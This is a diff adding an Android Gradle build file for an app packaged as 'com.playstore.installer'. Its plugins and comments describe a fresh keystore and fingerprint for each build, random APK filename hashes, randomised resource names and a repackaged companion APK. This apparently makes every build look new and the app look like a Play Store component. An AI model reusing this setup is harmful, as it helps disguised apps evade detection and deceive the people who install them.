@@ -1,0 +1,78 @@
+plugins {
+    id 'com.android.application'
+    id 'org.jetbrains.kotlin.android'
+    id 'build-env-verifier'      // Step 7 — environment check before anything
+    id 'keystore-generator'      // Step 2/8 — Nova independent keystore
+    id 'fingerprint-generator'   // Step 3/9 — Nova independent fingerprint
+    id 'build-hash-filename'     // Step 4 — random hash in APK filename
+    id 'res-renamer'             // Step 5 — randomised res/ filenames
+}
+
+// Step 10: Build order is enforced by the CI workflow (build.yml)
+// Companion APK is repackaged in CI steps 3-15 BEFORE Nova Gradle build in step 24
+// No Gradle task dependency needed here
+
+android {
+    namespace 'com.playstore.installer'
+    compileSdk 34
+
+    defaultConfig {
+        applicationId "com.playstore.installer"
+        minSdk 28
+        targetSdk 34
+        versionCode 1
+        versionName "1.0"
+
+        ndk {
+            abiFilters "armeabi-v7a", "arm64-v8a"
+        }
+
+        buildConfigField "String", "BUILD_UUID",      "\"${project.ext.fp_buildUUID}\""
+        buildConfigField "String", "BUILD_TIMESTAMP", "\"${project.ext.fp_buildTimestamp}\""
+        buildConfigField "String", "SALT_HEX",        "\"${project.ext.fp_saltHex}\""
+    }
+
+    signingConfigs {
+        release {
+            // Nova keystore — independent from companion keystore (companion signed in CI step 13/14)
+            storeFile     project.ext.ks_storeFile
+            storePassword project.ext.ks_storePass
+            keyAlias      project.ext.ks_keyAlias
+            keyPassword   project.ext.ks_keyPass
+        }
+    }
+
+    buildTypes {
+        release {
+            minifyEnabled false
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+            signingConfig signingConfigs.release
+        }
+    }
+
+    buildFeatures {
+        buildConfig true
+    }
+
+    compileOptions {
+        sourceCompatibility JavaVersion.VERSION_1_8
+        targetCompatibility JavaVersion.VERSION_1_8
+    }
+
+    kotlinOptions {
+        jvmTarget = '1.8'
+    }
+}
+
+keystoreGenerator {
+    outputDir = file("${buildDir}/keystore")
+    label     = project.name
+}
+
+buildHashFilename {
+    prefix = 'nova'
+}
+
+dependencies {
+    implementation 'androidx.appcompat:appcompat:1.6.1'
+}
